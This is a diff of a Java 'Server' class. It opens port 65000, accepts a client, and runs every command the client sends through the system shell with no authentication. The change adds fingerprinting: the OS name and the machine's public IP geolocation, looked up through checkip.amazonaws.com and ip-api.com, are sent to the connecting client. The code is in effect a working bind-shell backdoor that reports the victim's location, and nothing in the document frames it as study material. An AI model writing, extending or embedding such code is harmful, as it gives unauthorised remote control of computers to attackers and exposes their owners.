@@ -1,31 +1,32 @@
-import java.net.*;
 import java.io.*;
+import java.net.*;
 
 public class Server {
-    public static void Initialize(String address, int port) {
-        try {
-            // Create a server socket
-            ServerSocket server = new ServerSocket(port);
+    // Method to initialize the server with the given address and port
+    public static void initialize(String address, int port) {
+        try (ServerSocket server = new ServerSocket(port)) {
             System.out.println("Server started on port " + port + ", address: " + address);
 
-            // Establish a connection with the client
-            Socket socket = server.accept();
-            System.out.println("Client connected");
+            try (Socket clientSocket = server.accept()) {
+                System.out.println("\nClient connected\n");
 
-            // Get input from the client
-            DataInputStream input = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
+                DataInputStream input = new DataInputStream(new BufferedInputStream(clientSocket.getInputStream()));
+                PrintWriter output = new PrintWriter(clientSocket.getOutputStream(), true);
 
-            // Read input from the client and execute commands based on the operating system
-            String line = "";
-            String os = System.getProperty("os.name");
+                // Get the operating system name and send it to the client
+                String os = System.getProperty("os.name");
+                output.println(os);
 
-            while (!line.equalsIgnoreCase("exit")) {
-                try {
-                    // Read the message sent by the client via socket
+                // Get geolocation information and send it to the client
+                String geoLocation = getGeoLocation();
+                output.println(geoLocation);
+
+                String line = "";
+                // Receive commands from the client and execute them based on the operating system
+                while (!line.equalsIgnoreCase("exit")) {
                     line = input.readUTF();
                     System.out.println(line);
 
-                    // Execute the command based on the operating system
                     Process process;
                     if (os.toLowerCase().contains("windows")) {
                         process = Runtime.getRuntime().exec(new String[]{"cmd", "/c", line});
@@ -33,32 +34,55 @@ public class Server {
                         process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", line});
                     }
 
-                    // Wait for the command to finish
                     process.waitFor();
-                } catch (IOException | InterruptedException e) {
-                    System.out.println("Oops.. Something went wrong.");
-                    System.out.println("Exception: " + e.getMessage());
                 }
+            } catch (IOException | InterruptedException e) {
+                System.out.println("Oops.. Something went wrong.");
+                System.out.println("Exception: " + e.getMessage());
+                System.exit(2);
             }
 
-            // Close the connection
             System.out.println("Server shutting down");
-            socket.close();
-            input.close();
-            server.close();
-
         } catch (IOException e) {
             System.out.println("IO exception: " + e.getMessage());
+            System.exit(2);
         }
     }
 
+    // Method to fetch geolocation information
+    public static String getGeoLocation() throws IOException {
+        try {
+            URL whatismyip = new URL("http://checkip.amazonaws.com");
+            BufferedReader in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
+                String ip = in.readLine();
+
+                URL ipapi = new URL("http://ip-api.com/json/" + ip);
+                URLConnection c = ipapi.openConnection();
+
+                try (BufferedReader reader = new BufferedReader(new InputStreamReader(c.getInputStream()))) {
+                    StringBuilder geoInfo = new StringBuilder();
+                    String line;
+                    while ((line = reader.readLine()) != null) {
+                        geoInfo.append(line);
+                    }
+                    return geoInfo.toString();
+                }
+            } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+
+    // Main method to start the server
     public static void main(String[] args) {
         try {
             InetAddress localIpAddress = InetAddress.getLocalHost();
             String address = localIpAddress.getHostAddress();
-            Initialize(address, 65000);
+            initialize(address, 65000);
         } catch (UnknownHostException e) {
             System.out.println("Error getting local host address: " + e.getMessage());
+            System.exit(2);
         }
     }
 }
+
